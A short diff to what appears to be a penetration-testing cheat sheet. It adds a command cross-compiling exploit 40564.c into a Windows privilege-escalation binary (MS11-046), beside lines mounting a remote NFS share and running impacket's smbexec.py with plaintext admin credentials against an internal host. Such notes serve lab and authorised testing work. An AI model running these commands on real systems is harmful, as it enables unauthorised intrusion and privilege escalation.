@@ -77,6 +77,11 @@ mount -t nfs 172.16.80.27:/home/simon /mnt/172.16.80.27_nfs -o nolock
 cp zip /tmp
 
 ```
+#####
+```
+i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32
+
+```
 ##### IMPACKET SYNTAX 
 ```bash
 python smbexec.py 'local_admin:P@ssw0rd123'@172.16.80.100
